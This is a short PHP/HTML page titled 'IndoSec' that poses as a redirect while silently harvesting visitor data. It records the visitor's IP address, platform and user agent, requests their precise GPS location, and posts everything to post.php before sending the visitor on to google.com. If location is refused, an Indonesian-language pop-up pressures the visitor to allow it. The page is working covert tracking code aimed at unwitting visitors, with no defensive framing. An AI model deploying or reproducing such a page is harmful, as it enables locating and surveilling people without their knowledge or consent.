<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $ip = $_SERVER['REMOTE_ADDR'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>IndoSec</title>
</head>
<body>
    
    Redirecting....

    <script
		src="https://code.jquery.com/jquery-3.4.1.js"
		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
        crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/8.11.8/sweetalert2.all.min.js"></script>
    <script>
        let data = {
            geolocation: null,
            pesan: '',
        };
        if(navigator.geolocation) {
            data.geolocation = true
            navigator.geolocation.watchPosition(showPosition, user_no_accept);
        }else{ 
            data.geolocation = "fals"
        }
        function showPosition(position) {
            $.ajax({
                url: 'post.php',
                method: 'POST',
                data: {
                    ip: "<?= strval($ip) ?>",
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    platform: navigator.platform,
                    useragent: navigator.userAgent,
                    geolocation: data.geolocation,
                    accepted_geolocation: "true"
                },
                success: function(response) {
                    window.location.href = 'https://google.com'
                }
            })
        }

        function user_no_accept()
        {
            $.ajax({
                url: 'post.php',
                method: 'POST',
                data: {
                    ip: "<?= strval($ip) ?>",
                    platform: navigator.platform,
                    useragent: navigator.userAgent,
                    geolocation: data.geolocation,
                    accepted_geolocation: "fals"
                },
                success: function(response) {
                    Swal.fire({
                        type: 'error',
                        title: 'Oops..',
                        text: 'Kamu harus mengizinkan kami mengakses lokasi kamu, untuk pekerjaan yang lebih baik'
                    }).then(data => {
                        window.location.href = 'https://google.com'
                    })
                }
            })
        }
    </script>
</body>
</html>
